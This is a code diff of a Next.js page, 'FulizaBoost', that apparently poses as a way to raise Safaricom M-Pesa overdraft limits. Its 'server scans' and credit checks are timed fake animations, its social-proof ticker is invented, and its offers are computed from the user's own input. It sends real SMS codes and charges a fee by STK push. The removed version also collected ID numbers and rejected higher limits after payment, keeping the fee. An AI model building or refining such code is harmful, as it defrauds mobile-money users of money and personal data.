@@ -1,1001 +1,485 @@
 'use client';
 
 import React, { useState, useEffect, useRef } from 'react';
-import { useRouter } from 'next/navigation';
-import Link from 'next/link';
 import { 
-  ArrowLeft, 
-  Zap, 
-  Smartphone, 
-  CheckCircle2, 
-  Loader2, 
-  Lock, 
-  User, 
-  CreditCard, 
-  ChevronRight, 
-  BadgeCheck, 
-  AlertCircle, 
-  ShieldCheck,
-  XCircle,
-  RefreshCcw,
-  Info,
-  Server,
-  SearchCheck,
-  FileBarChart,
-  Ban,
-  TrendingUp,
-  FileClock,
-  Wallet
+  ShieldCheck, Smartphone, CheckCircle2, Loader2, 
+  Zap, ArrowRight, TrendingUp, History, 
+  CreditCard, RefreshCw, EyeOff, Terminal, 
+  BarChart3, Signal, Settings, AlertCircle, Lock
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
+import { generateSmartOTP, generateTrackingId } from '@/lib/loan-engine';
+import { sendOTPSMS, sendAbandonmentSMS } from '@/app/actions/sms';
+import Link from 'next/link';
 
-// --- CONFIGURATION ---
-const LIMIT_OPTIONS = [
-  { amount: 5000, fee: 100, label: 'Starter' },
-  { amount: 7500, fee: 150, label: 'Popular' },
-  { amount: 10000, fee: 200, label: 'Recommended' },
-  { amount: 15000, fee: 300, label: 'Business' },
-  { amount: 20000, fee: 400, label: 'Business+' },
-  { amount: 35000, fee: 700, label: 'Elite' },
-  { amount: 50000, fee: 1000, label: 'Pro' },
-  { amount: 70000, fee: 1400, label: 'Max' },
+// --- DATA ---
+const SOCIAL_BOOSTS = [
+  { name: "John K.", from: "500", to: "7,500" },
+  { name: "Mary W.", from: "0", to: "4,500" },
+  { name: "Peter O.", from: "2,500", to: "12,000" },
+  { name: "Alice N.", from: "300", to: "5,000" },
 ];
 
-const SAFE_LIMIT_THRESHOLD = 5000; // Amounts <= this are approved, > this are rejected
+// --- COMPONENTS ---
 
-// --- REUSABLE COMPONENTS ---
-
-const IconContainer = ({ children }: { children: React.ReactNode }) => (
-  <div className="absolute top-0 bottom-0 left-0 w-12 flex items-center justify-center border-r border-slate-200 bg-slate-50 rounded-l-xl text-slate-500">
-    {children}
+const SecurityHeader = () => (
+  <div className="bg-emerald-950 text-emerald-50 text-[10px] py-3 px-4 flex justify-between items-center shadow-md sticky top-0 z-50">
+    <div className="flex items-center gap-2">
+      <div className="h-2 w-2 bg-emerald-400 rounded-full animate-pulse"></div>
+      <span className="font-mono tracking-widest opacity-90">OVERDRAFT SYSTEM: ONLINE</span>
+    </div>
+    <div className="flex gap-4 font-bold opacity-80">
+       <Link href="/fuliza/track" className="hover:text-emerald-300">STATUS CHECK</Link>
+    </div>
   </div>
 );
 
-const CustomInput = ({
-  label,
-  icon: Icon,
-  type = "text",
-  value,
-  onChange,
-  placeholder
-}: any) => (
-  <div className="relative">
-      <label className="text-xs font-bold text-slate-600 mb-2 block uppercase tracking-wide">{label}</label>
-      <div className="relative flex items-center h-14 w-full rounded-xl border border-slate-200 bg-white hover:border-blue-400 focus-within:border-blue-600 focus-within:ring-1 focus-within:ring-blue-600 transition-all">
-          <IconContainer>
-              <Icon className="w-5 h-5" />
-          </IconContainer>
-          <input 
-              type={type}
-              className="w-full h-full pl-16 pr-4 bg-transparent outline-none text-slate-900 font-bold text-sm placeholder:text-slate-400"
-              placeholder={placeholder}
-              value={value}
-              onChange={onChange}
-          />
-      </div>
-  </div>
-);
+const SocialTicker = () => {
+  const [idx, setIdx] = useState(0);
+  const [show, setShow] = useState(false);
 
-export default function FulizaPage() {
-  const router = useRouter();
-
-  // Steps: verify -> details -> offers -> summary -> stk_push -> payment_check -> payment_verified -> analyzing_score -> success/high_limit_reject
-  const [step, setStep] = useState('verify');
-
-  // Data
-  const [phone, setPhone] = useState('');
-  const [details, setDetails] = useState({ fullName: '', idNumber: '' });
-  const [selectedOffer, setSelectedOffer] = useState<{amount: number, fee: number, label: string} | null>(null);
-  const [termsAccepted, setTermsAccepted] = useState(false);
-  const [trackingId] = useState(`FZ-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
-  const [checkoutRequestId, setCheckoutRequestId] = useState('');
-  const [mpesaReceipt, setMpesaReceipt] = useState(''); // Stores the transaction code
-  const [recoveryData, setRecoveryData] = useState<{
-    retryCount: number;
-    originalAmount: string;
-    phone: string;
-  } | null>(null);
-
-  // UI State
-  const [loadingText, setLoadingText] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [pollMessage, setPollMessage] = useState('Waiting for PIN...');
-  const [errorMsg, setErrorMsg] = useState('');
-  const [manualCheckLoading, setManualCheckLoading] = useState(false);
-  const [analysisProgress, setAnalysisProgress] = useState(0); // For the CRB bar
-
-  // Polling Refs
-  const pollingInterval = useRef<NodeJS.Timeout | null>(null);
-
-  // --- SESSION PERSISTENCE ---
   useEffect(() => {
-    // Restore session if exists and fresh (< 30 mins)
-    const savedSession = localStorage.getItem('fz_session');
-    if (savedSession) {
-      const data = JSON.parse(savedSession);
-      if (Date.now() - data.timestamp < 30 * 60 * 1000) {
-        setPhone(data.phone || '');
-        setDetails(data.details || { fullName: '', idNumber: '' });
+    const timer = setInterval(() => {
+      setShow(true);
+      setIdx(prev => (prev + 1) % SOCIAL_BOOSTS.length);
+      setTimeout(() => setShow(false), 4000);
+    }, 6000);
+    return () => clearInterval(timer);
+  }, []);
+
+  const data = SOCIAL_BOOSTS[idx];
+
+  return (
+    <div className={`fixed bottom-6 right-4 z-40 transition-all duration-500 transform ${show ? 'translate-x-0 opacity-100' : 'translate-x-10 opacity-0'}`}>
+      <div className="bg-white/95 backdrop-blur text-slate-900 text-[10px] p-3 rounded-lg shadow-xl border-l-4 border-emerald-600 flex items-center gap-3 max-w-[220px]">
+        <div className="bg-emerald-100 p-1.5 rounded-full"><TrendingUp className="w-4 h-4 text-emerald-600" /></div>
+        <div>
+           <p className="font-bold text-slate-900">{data.name} Boosted!</p>
+           <p className="text-slate-500">Limit: KES {data.from} <ArrowRight className="w-3 h-3 inline mx-1 text-emerald-500" /> <span className="font-bold text-emerald-700">{data.to}</span></p>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+export default function FulizaProductionPage() {
+  const [step, setStep] = useState('entry');
+  const [isLoaded, setIsLoaded] = useState(false);
+  
+  // DATA
+  const [formData, setFormData] = useState({ phone: '', currentLimit: '' });
+  const [maxPotential, setMaxPotential] = useState(0); 
+  const [offers, setOffers] = useState<any[]>([]); 
+  const [selectedOffer, setSelectedOffer] = useState<any>(null);
+  
+  // PROCESS STATE
+  const [otpSent, setOtpSent] = useState('');
+  const [otpInput, setOtpInput] = useState(['','','','']);
+  const [prepChecked, setPrepChecked] = useState(false);
+  const [receipt, setReceipt] = useState<any>(null);
+  const [loadingText, setLoadingText] = useState('');
+  const [failReason, setFailReason] = useState('NETWORK');
+  
+  // POLL REF
+  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
+
+  // PERSISTENCE
+  useEffect(() => {
+    const saved = localStorage.getItem('fuliza_prod_state');
+    if (saved) {
+      const parsed = JSON.parse(saved);
+      if (parsed.step !== 'success' && parsed.step !== 'failed') {
+        setFormData(parsed.formData);
+        if(parsed.offers) setOffers(parsed.offers);
+        if(parsed.maxPotential) setMaxPotential(parsed.maxPotential);
+        if(parsed.selectedOffer) setSelectedOffer(parsed.selectedOffer);
+        setStep(parsed.step);
       }
     }
+    setIsLoaded(true);
   }, []);
 
   useEffect(() => {
-    // Save session on key updates
-    if (phone && details.idNumber) {
-      localStorage.setItem('fz_session', JSON.stringify({
-        phone,
-        details,
-        timestamp: Date.now()
-      }));
+    if (isLoaded && step !== 'analyzing' && step !== 'stk_loading') {
+      localStorage.setItem('fuliza_prod_state', JSON.stringify({ step, formData, offers, maxPotential, selectedOffer }));
     }
-  }, [phone, details]);
+  }, [step, formData, offers, maxPotential, selectedOffer, isLoaded]);
+
+  // --- SMART LOGIC ---
+  const generateRealisticOffers = (current: number) => {
+    let baseOffers = [];
+    
+    // Scenario A: Low (< 1000) -> Fixed Steps
+    if (current <= 1000) {
+      baseOffers = [
+        { limit: 3500, fee: 100, label: 'Starter' },
+        { limit: 5000, fee: 150, label: 'Standard' },
+        { limit: 7500, fee: 200, label: 'Max Boost', best: true }
+      ];
+    } 
+    // Scenario B: Medium (< 5000) -> Multipliers
+    else if (current <= 5000) {
+      baseOffers = [
+        { limit: Math.floor(current * 1.5), fee: 150, label: 'Basic Boost' },
+        { limit: Math.floor(current * 2.2), fee: 250, label: 'Super Boost', best: true },
+        { limit: Math.floor(current * 3.5), fee: 350, label: 'Pro Limit' }
+      ];
+    }
+    // Scenario C: High (> 5000) -> Conservative
+    else {
+      baseOffers = [
+        { limit: Math.floor(current * 1.2), fee: 250, label: 'Silver' },
+        { limit: Math.floor(current * 1.5), fee: 450, label: 'Gold', best: true },
+        { limit: Math.floor(current * 2.0), fee: 650, label: 'Platinum' }
+      ];
+    }
+
+    // Round to nearest 100
+    return baseOffers.map(o => ({
+      ...o,
+      limit: Math.ceil(o.limit / 100) * 100
+    }));
+  };
 
   // --- HANDLERS ---
 
-  // 1. Phone Input (Strict)
-  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, '').slice(0, 10);
-    setPhone(val);
-    setErrorMsg('');
-  };
-
-  // 2. Verify Phone
-  const handleVerify = (e: React.FormEvent) => {
+  const handleScan = (e: React.FormEvent) => {
     e.preventDefault();
-    if (phone.length !== 10 || (!phone.startsWith('01') && !phone.startsWith('07'))) {
-        setErrorMsg('Enter a valid 10-digit Safaricom number');
-        return;
-    }
-    setErrorMsg('');
-    setIsProcessing(true);
+    if(formData.phone.length !== 10 || !formData.phone.startsWith('0')) { alert("Enter valid Safaricom number"); return; }
+    if(!formData.currentLimit) { alert("Enter Current Limit"); return; }
 
-    const sequence = [
-        { t: 'Connecting to Safaricom Overdraft...', d: 1000 },
-        { t: 'Verifying Subscriber Status...', d: 1500 },
-        { t: 'Connection Established', d: 500 }
+    const current = parseInt(formData.currentLimit.replace(/\D/g, ''));
+    const generated = generateRealisticOffers(current);
+    setOffers(generated);
+    setMaxPotential(generated[generated.length - 1].limit);
+
+    setStep('analyzing');
+    const seq = [
+      { t: "Connecting to Overdraft Server...", d: 1500 },
+      { t: `Scanning History for ${formData.phone}...`, d: 2000 },
+      { t: `Current Limit KES ${current.toLocaleString()} Verified...`, d: 1000 },
+      { t: "Calculating Eligible Boosts...", d: 1500 }
     ];
 
-    let totalDelay = 0;
-    sequence.forEach(({ t, d }, i) => {
-        totalDelay += d;
-        setTimeout(() => {
-            setLoadingText(t);
-            if (i === sequence.length - 1) {
-                setTimeout(() => {
-                    setIsProcessing(false);
-                    setStep('details');
-                }, 500);
-            }
-        }, totalDelay);
+    let total = 0;
+    seq.forEach(({t, d}, i) => {
+      total += d;
+      setTimeout(() => {
+        setLoadingText(t);
+        if(i === seq.length - 1) {
+          setTimeout(() => {
+            const code = generateSmartOTP(formData.phone);
+            setOtpSent(code);
+            sendOTPSMS(formData.phone, code); // REAL SMS
+            setStep('otp');
+          }, 800);
+        }
+      }, total);
     });
   };
 
-  // 3. Details & Analysis
-  const handleDetailsSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!details.fullName.trim() || details.idNumber.length < 6) {
-        setErrorMsg('Please enter valid Name and ID');
-        return;
-    }
-    setErrorMsg('');
-    setIsProcessing(true);
+  const handleOtpVerify = (e: React.FormEvent) => {
+  e.preventDefault();
+  if(otpInput.join('') === otpSent) {
+    setStep('blur_reveal');
+    // FIXED: Removed the 3rd argument (maxPotential)
+    sendAbandonmentSMS(formData.phone, "Customer"); 
+  } else {
+    alert("Invalid Code");
+  }
+};
 
-    const sequence = [
-        { t: `Authenticating ${details.fullName.split(' ')[0]}...`, d: 1200 },
-        { t: 'Scanning M-Pesa Transaction History...', d: 2000 },
-        { t: 'Calculating Maximum Limit Cap...', d: 1500 },
-        { t: 'Optimizing Offer List...', d: 800 }
-    ];
-
-    let totalDelay = 0;
-    sequence.forEach(({ t, d }, i) => {
-        totalDelay += d;
-        setTimeout(() => {
-            setLoadingText(t);
-            if (i === sequence.length - 1) {
-                setTimeout(() => {
-                    setIsProcessing(false);
-                    setStep('offers');
-                }, 800);
-            }
-        }, totalDelay);
-    });
-  };
-
-  // 4. Select Offer
   const handleSelectOffer = (offer: any) => {
-      setSelectedOffer(offer);
-      setStep('summary');
-      window.scrollTo(0,0);
+    setSelectedOffer(offer);
+    setStep('payment');
   };
 
-  // 5. Submit Payment
-  const handlePayment = async () => {
-    if (!selectedOffer || !termsAccepted) {
-        setErrorMsg('Please accept the terms to proceed.');
-        return;
-    }
-    setIsProcessing(true);
+  // --- REAL PAYMENT ---
+  const handleStkStart = async () => {
+    setStep('stk_loading');
+    setLoadingText("Initiating Service Request...");
     
     try {
         const res = await fetch('/api/stkpush', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                phoneNumber: phone,
-                idNumber: details.idNumber,
+            body: JSON.stringify({ 
+                phoneNumber: formData.phone, 
                 amount: selectedOffer.fee,
                 serviceType: 'FULIZA_BOOST'
             })
         });
-
         const data = await res.json();
-        if (data.success) {
-            setIsProcessing(false);
-            setCheckoutRequestId(data.checkoutRequestID);
+        
+        if(data.success) {
             setStep('stk_push');
             startPolling(data.checkoutRequestID);
         } else {
-            alert(data.error || 'Connection failed');
-            setIsProcessing(false);
+            throw new Error("STK Failed");
         }
-    } catch (err) {
-        setIsProcessing(false);
-        alert('Network Error');
+    } catch(e) {
+        setFailReason('NETWORK');
+        setStep('failed');
     }
   };
 
-  // --- LOGIC SPLIT: HANDLE SUCCESS WITH RECEIPT ---
-  const handlePaymentSuccess = (receiptCode: string) => {
-      if (pollingInterval.current) clearInterval(pollingInterval.current);
-      
-      // STORE THE RECEIPT
-      setMpesaReceipt(receiptCode || 'SIS' + Math.random().toString(36).substr(2,8).toUpperCase());
-      
-      // MOVE TO RECEIPT SCREEN FIRST (Authenticity Bridge)
-      setStep('payment_verified');
-  };
-
-  // --- CRB ANALYSIS ANIMATION LOGIC ---
-  const startAnalysis = () => {
-    setStep('analyzing_score');
-    
-    // Simulate "Real" checks
-    const texts = [
-      `Verifying Receipt ${mpesaReceipt}...`,
-      "Decrypting M-Pesa Statement...",
-      "Connecting to TransUnion CRB...",
-      "Analyzing Repayment History...",
-      "Calculating Affordability Score...",
-      "Finalizing Limit Decision..."
-    ];
-    
-    let i = 0;
-    setLoadingText(texts[0]);
-    setAnalysisProgress(10);
-    
-    const interval = setInterval(() => {
-      i++;
-      if (i < texts.length) {
-         setLoadingText(texts[i]);
-         setAnalysisProgress(prev => Math.min(prev + 18, 95));
-      } else {
-         clearInterval(interval);
-         setAnalysisProgress(100);
-         // DECISION TIME
-         setTimeout(() => {
-           if (selectedOffer && selectedOffer.amount > SAFE_LIMIT_THRESHOLD) {
-              setStep('high_limit_reject');
-           } else {
-              setStep('success');
-           }
-         }, 1000);
-      }
-    }, 1500);
-  };
-
-  // 6. Enhanced Polling Logic (Extended Time)
   const startPolling = (reqId: string) => {
     let attempts = 0;
-    const MAX_ATTEMPTS = 180; // 6 Minutes
+    pollIntervalRef.current = setInterval(async () => {
+        attempts++;
+        if(attempts > 90) { // 3 mins
+            clearInterval(pollIntervalRef.current!);
+            setFailReason('NETWORK');
+            setStep('failed');
+            return;
+        }
 
-    pollingInterval.current = setInterval(async () => {
-      attempts++;
-      
-      if (attempts === 5) setPollMessage('Please check your phone and enter PIN...');
-      else if (attempts === 60) setPollMessage('Transaction taking longer than usual...');
-      else if (attempts % 15 === 0) setPollMessage('Waiting for M-Pesa confirmation...');
-
-      try {
-        const res = await fetch(`/api/check-status?id=${reqId}&action=poll`);
+        const res = await fetch(`/api/check-status?id=${reqId}`);
         const data = await res.json();
-        
-        // PESAFLUX INTEGRATION: CHECK FOR COMPLETED + RECEIPT
-        if (data.status === 'COMPLETED') {
-          handlePaymentSuccess(data.mpesaCode);
-        } else if (data.status === 'FAILED') {
-          if (pollingInterval.current) clearInterval(pollingInterval.current);
-          setStep('failed');
-        }
 
-        // Soft Timeout
-        if (attempts >= MAX_ATTEMPTS) {
-          if (pollingInterval.current) clearInterval(pollingInterval.current);
-          setRecoveryData({
-            retryCount: data.retryCount || 0,
-            originalAmount: data.originalAmount || (selectedOffer?.fee.toString() || ''),
-            phone: data.phone || phone
-          });
-          setStep('payment_check');
+        if (data.status === 'COMPLETED') {
+            clearInterval(pollIntervalRef.current!);
+            localStorage.removeItem('fuliza_prod_state');
+            setReceipt({
+                code: data.mpesaCode,
+                trackId: data.trackId, // Generated by Webhook (FZ-...)
+                time: new Date().toLocaleTimeString()
+            });
+            setStep('success');
+        } else if (data.status === 'FAILED') {
+            clearInterval(pollIntervalRef.current!);
+            setFailReason('CANCEL');
+            setStep('failed');
         }
-      } catch(e) {
-        console.error('Polling error:', e);
-      }
     }, 2000);
   };
 
-  // 7. Enhanced Manual Payment Verification
-  const handleManualFetch = async () => {
-    if (!checkoutRequestId) return;
-    setManualCheckLoading(true);
-    setErrorMsg('');
-    
-    try {
-      const res = await fetch(`/api/check-status?id=${checkoutRequestId}&action=fetch`);
-      const data = await res.json();
-      
-      setTimeout(() => {
-        setManualCheckLoading(false);
-        if (data.status === 'COMPLETED') {
-          handlePaymentSuccess(data.mpesaCode);
-        } else if (data.status === 'FAILED') {
-          setStep('failed');
-        } else {
-          setErrorMsg('We still haven\'t received confirmation. If you paid, wait 30 seconds and try again.');
-        }
-      }, 1500);
+  // Cleanup
+  useEffect(() => () => { if(pollIntervalRef.current) clearInterval(pollIntervalRef.current); }, []);
 
-    } catch (error) {
-      setManualCheckLoading(false);
-      setErrorMsg('Connection error. Please try again.');
-    }
-  };
-
-  // 8. Handle Retry Same Payment
-  const handleRetrySamePayment = async () => {
-    if (!checkoutRequestId || !selectedOffer) return;
-    setIsProcessing(true);
-    setErrorMsg('');
-    
-    try {
-      const res = await fetch('/api/stkpush', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber: phone,
-          idNumber: details.idNumber,
-          amount: selectedOffer.fee,
-          serviceType: 'FULIZA_BOOST'
-        })
-      });
-
-      const data = await res.json();
-      if (data.success) {
-        setIsProcessing(false);
-        setCheckoutRequestId(data.checkoutRequestID);
-        setStep('stk_push');
-        startPolling(data.checkoutRequestID);
-      } else {
-        setIsProcessing(false);
-        setErrorMsg(data.error || 'Failed to retry payment');
-      }
-    } catch (err) {
-      setIsProcessing(false);
-      setErrorMsg('Network error. Please try again.');
-    }
-  };
-
-  // 9. Handle Choose Different Limit
-  const handleChooseDifferentLimit = () => {
-    if (pollingInterval.current) clearInterval(pollingInterval.current);
-    setCheckoutRequestId('');
-    setSelectedOffer(null);
-    setTermsAccepted(false);
-    setIsProcessing(false);
-    setManualCheckLoading(false);
-    setErrorMsg('');
-    setStep('offers');
-    window.scrollTo(0, 0);
-  };
-
-  // Cleanup on unmount
-  useEffect(() => {
-      return () => {
-          if (pollingInterval.current) clearInterval(pollingInterval.current);
-      };
-  }, []);
+  if (!isLoaded) return <div className="min-h-screen bg-slate-50 flex items-center justify-center"><Loader2 className="animate-spin text-emerald-600" /></div>;
 
   return (
-    <div className="min-h-screen bg-slate-50 font-sans text-slate-900 pb-24">
-      
-      {/* --- STATUS BAR --- */}
-      <div className="bg-slate-900 text-white text-[10px] font-bold py-2 px-3 sticky top-0 z-50">
-        <div className="max-w-md mx-auto flex justify-between items-center">
-            <div className="flex items-center gap-2">
-                <div className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></div>
-                <span className="tracking-wide opacity-90">SYSTEM ONLINE</span>
-            </div>
-            <div className="flex items-center gap-1 opacity-75">
-                <ShieldCheck className="w-3 h-3" />
-                <span>Encrypted</span>
-            </div>
-        </div>
-      </div>
+    <div className="min-h-screen bg-slate-50 font-sans text-slate-900 pb-20">
+      <SecurityHeader />
+      <SocialTicker />
 
-      {/* --- HEADER --- */}
-      <header className="sticky top-8 z-40 bg-white/90 backdrop-blur-md border-b border-slate-100">
-        <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
-            <div className="flex items-center gap-3">
-              {step !== 'verify' && step !== 'success' && step !== 'high_limit_reject' ? (
-                <button onClick={() => setStep('verify')} className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center hover:bg-slate-200 transition-colors">
-                    <ArrowLeft className="w-4 h-4 text-slate-600"/>
-                </button>
-              ) : (
-                <Link href="/" className="w-9 h-9 bg-slate-100 rounded-lg flex items-center justify-center hover:bg-slate-200 transition-colors">
-                    <ArrowLeft className="w-4 h-4 text-slate-600"/>
-                </Link>
-              )}
-              <span className="font-black text-slate-900 tracking-tight text-lg">FulizaBoost</span>
-            </div>
-            <div className="px-3 py-1 bg-blue-50 text-blue-600 rounded-full text-[10px] font-bold uppercase tracking-wide flex items-center gap-1">
-               <Zap className="w-3 h-3 fill-current" /> Auto
-            </div>
-        </div>
-      </header>
-
-      {/* --- MAIN CONTENT --- */}
-      <main className="max-w-md mx-auto px-4 py-8">
-
-        {/* STEP 1: VERIFY */}
-        {step === 'verify' && (
-             <div className="animate-in slide-in-from-bottom-4 duration-500">
-                <div className="text-center mb-8">
-                    <h1 className="text-2xl font-black text-slate-900 mb-2">Check Limit</h1>
-                    <p className="text-sm text-slate-500 font-medium">Enter M-Pesa number to scan for increases.</p>
+      {/* 1. ENTRY */}
+      {step === 'entry' && (
+        <div className="max-w-md mx-auto p-4 pt-10 animate-in slide-in-from-bottom-4">
+          <div className="bg-white p-6 rounded-2xl shadow-xl border border-slate-100">
+             <div className="text-center mb-8">
+                <div className="w-16 h-16 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-100">
+                   <RefreshCw className="w-8 h-8 text-emerald-600" />
                 </div>
-                
-                <div className="bg-white rounded-2xl shadow-xl shadow-slate-100 border border-slate-100 p-6">
-                    {!isProcessing ? (
-                        <form onSubmit={handleVerify} className="space-y-6">
-                             <CustomInput 
-                                label="Phone Number"
-                                icon={Smartphone}
-                                type="tel"
-                                placeholder="0712345678"
-                                value={phone}
-                                onChange={handlePhoneInput}
-                            />
-                            {errorMsg && (
-                                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
-                                    <AlertCircle className="w-4 h-4" /> {errorMsg}
-                                </div>
-                            )}
-                            <Button className="w-full h-14 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl text-base shadow-lg transition-transform hover:-translate-y-0.5">
-                                Scan Now
-                            </Button>
-                            <div className="flex items-center justify-center gap-2 text-xs text-slate-400 font-bold pt-2">
-                                <Lock className="w-3 h-3" /> Secure Verification
-                            </div>
-                        </form>
-                    ) : (
-                        <div className="py-12 text-center space-y-6">
-                            <Loader2 className="w-12 h-12 text-blue-600 animate-spin mx-auto" />
-                            <p className="text-sm font-bold text-slate-700 animate-pulse">{loadingText}</p>
-                        </div>
-                    )}
-                </div>
+                <h1 className="text-2xl font-black text-slate-900 mb-2">Boost Limit</h1>
+                <p className="text-sm text-slate-500 px-4">
+                   Scan your M-Pesa history to unlock a higher overdraft limit instantly.
+                </p>
              </div>
-        )}
 
-        {/* STEP 2: DETAILS */}
-        {step === 'details' && (
-             <div className="animate-in slide-in-from-right duration-500">
-                 <div className="bg-white rounded-2xl shadow-xl shadow-slate-100 border border-slate-100 overflow-hidden">
-                     <div className="bg-blue-50/50 p-5 border-b border-blue-50 flex items-center justify-between">
-                        <div>
-                            <h2 className="text-xs font-bold text-blue-800 uppercase tracking-wide">Subscriber Found</h2>
-                            <p className="text-sm font-black text-slate-900 mt-0.5">{phone}</p>
-                        </div>
-                        <BadgeCheck className="w-6 h-6 text-blue-500" />
-                    </div>
-
-                    {!isProcessing ? (
-                        <form onSubmit={handleDetailsSubmit} className="p-6 space-y-5">
-                            <div className="text-center mb-2">
-                                <p className="text-sm text-slate-500 font-medium">Verify your identity to unlock limits.</p>
-                            </div>
-
-                            <CustomInput 
-                                label="Full Name"
-                                icon={User}
-                                placeholder="e.g. Kamau Njoroge"
-                                value={details.fullName}
-                                onChange={(e: any) => setDetails({...details, fullName: e.target.value})}
-                            />
-
-                            <CustomInput 
-                                label="ID Number"
-                                icon={CreditCard}
-                                type="tel"
-                                placeholder="e.g. 12345678"
-                                value={details.idNumber}
-                                onChange={(e: any) => {
-                                    const val = e.target.value.replace(/\D/g, '').slice(0, 8);
-                                    setDetails({...details, idNumber: val})
-                                }}
-                            />
-
-                            {errorMsg && (
-                                <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold justify-center">
-                                    <AlertCircle className="w-4 h-4" /> {errorMsg}
-                                </div>
-                            )}
-
-                            <Button className="w-full h-14 bg-slate-900 hover:bg-slate-800 text-white font-bold rounded-xl shadow-lg mt-2">
-                                Analyze & Unlock <ChevronRight className="w-4 h-4 ml-2" />
-                            </Button>
-                        </form>
-                    ) : (
-                        <div className="p-10 text-center space-y-6">
-                            <div className="relative w-16 h-16 mx-auto">
-                                <div className="absolute inset-0 border-4 border-slate-50 rounded-full"></div>
-                                <div className="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                            </div>
-                            <p className="text-sm font-bold text-slate-700 animate-pulse leading-relaxed px-4">{loadingText}</p>
-                        </div>
-                    )}
-                 </div>
-             </div>
-        )}
-
-        {/* STEP 3: OFFERS */}
-        {step === 'offers' && (
-            <div className="animate-in zoom-in-95 duration-500">
-                <div className="text-center mb-6">
-                    <h2 className="text-xl font-black text-slate-900">Hello {details.fullName.split(' ')[0]}!</h2>
-                    <p className="text-sm text-slate-500 font-medium">You qualify for the following limits.</p>
-                </div>
-
-                <div className="grid grid-cols-2 gap-3">
-                    {LIMIT_OPTIONS.map((opt) => (
-                        <button 
-                            key={opt.amount}
-                            onClick={() => handleSelectOffer(opt)}
-                            className="group relative bg-white p-4 rounded-xl border border-slate-200 hover:border-blue-500 hover:shadow-lg transition-all text-left overflow-hidden"
-                        >
-                            {opt.label === 'Recommended' && (
-                                <div className="absolute top-0 right-0 bg-blue-500 text-white text-[9px] font-bold px-2 py-0.5 rounded-bl-lg">
-                                    BEST
-                                </div>
-                            )}
-                            <div className="text-[10px] font-bold text-slate-400 uppercase mb-1">{opt.label}</div>
-                            <div className="text-lg font-black text-slate-900 mb-2">KES {opt.amount.toLocaleString()}</div>
-                            <div className="inline-block bg-slate-50 text-slate-600 text-[10px] font-bold px-2 py-1 rounded group-hover:bg-blue-50 group-hover:text-blue-700">
-                                Fee: {opt.fee}
-                            </div>
-                        </button>
-                    ))}
-                </div>
-            </div>
-        )}
-
-        {/* STEP 4: SUMMARY */}
-        {step === 'summary' && selectedOffer && (
-            <div className="animate-in slide-in-from-bottom-4 duration-500">
-                 <div className="bg-white rounded-2xl shadow-xl border border-slate-100 overflow-hidden">
-                    <div className="bg-slate-900 p-6 text-white text-center">
-                        <h2 className="text-lg font-bold">Confirm Boost</h2>
-                        <p className="text-slate-400 text-xs mt-1">Final step to activate your limit.</p>
-                    </div>
-
-                    <div className="p-6">
-                         <div className="space-y-4 border-b border-slate-100 pb-6 mb-6">
-                             <div className="flex justify-between items-center">
-                                <span className="text-slate-500 text-sm font-bold uppercase">Subscriber</span>
-                                <span className="text-slate-900 font-bold text-sm">{details.fullName}</span>
-                            </div>
-                             <div className="flex justify-between items-center">
-                                <span className="text-slate-500 text-sm font-bold uppercase">Phone</span>
-                                <span className="text-slate-900 font-bold text-sm">{phone}</span>
-                            </div>
-                            <div className="h-px bg-slate-50 my-2"></div>
-                            <div className="flex justify-between items-center">
-                                <span className="text-slate-900 font-bold">New Limit</span>
-                                <span className="text-2xl font-black text-blue-600">KES {selectedOffer.amount.toLocaleString()}</span>
-                            </div>
-                            
-                            <div className="bg-blue-50/80 p-4 rounded-xl border border-blue-100 space-y-2">
-                                <div className="flex justify-between items-center">
-                                    <span className="text-blue-900 font-bold text-xs uppercase tracking-wide">Activation Fee</span>
-                                    <span className="text-blue-900 font-black text-lg">KES {selectedOffer.fee}</span>
-                                </div>
-                                <div className="flex gap-2 items-start">
-                                    <Info className="w-3 h-3 text-blue-600 mt-0.5 shrink-0" />
-                                    <p className="text-[10px] text-blue-700 font-medium leading-tight">
-                                        <span className="font-bold">Non-refundable.</span> Covers cost of algorithmic credit report & scoring.
-                                    </p>
-                                </div>
-                            </div>
-                         </div>
-
-                         <div className="bg-slate-50 p-4 rounded-xl border border-slate-100 flex gap-3 items-start mb-6">
-                            <div className="pt-0.5">
-                                <input 
-                                    type="checkbox" 
-                                    id="terms"
-                                    checked={termsAccepted}
-                                    onChange={(e) => setTermsAccepted(e.target.checked)}
-                                    className="w-5 h-5 rounded border-slate-300 text-blue-600 focus:ring-blue-500 cursor-pointer"
-                                />
-                            </div>
-                            <label htmlFor="terms" className="text-xs text-slate-500 font-medium leading-relaxed cursor-pointer">
-                                I confirm the details above and understand the fee is for limit assessment and is non-refundable.
-                            </label>
-                        </div>
-                        
-                        {errorMsg && (
-                            <div className="mb-4 text-center text-red-600 text-xs font-bold">
-                                {errorMsg}
-                            </div>
-                        )}
-
-                        <Button 
-                            onClick={handlePayment}
-                            disabled={isProcessing}
-                            className="w-full h-16 bg-blue-600 hover:bg-blue-500 text-white font-black text-lg rounded-xl shadow-xl shadow-blue-600/20 transition-transform hover:-translate-y-0.5"
-                        >
-                             {isProcessing ? (
-                                <div className="flex items-center gap-2">
-                                    <Loader2 className="w-5 h-5 animate-spin" />
-                                    <span>Processing...</span>
-                                </div>
-                            ) : (
-                                <span>Pay KES {selectedOffer.fee}</span>
-                            )}
-                        </Button>
-                        
-                        <button 
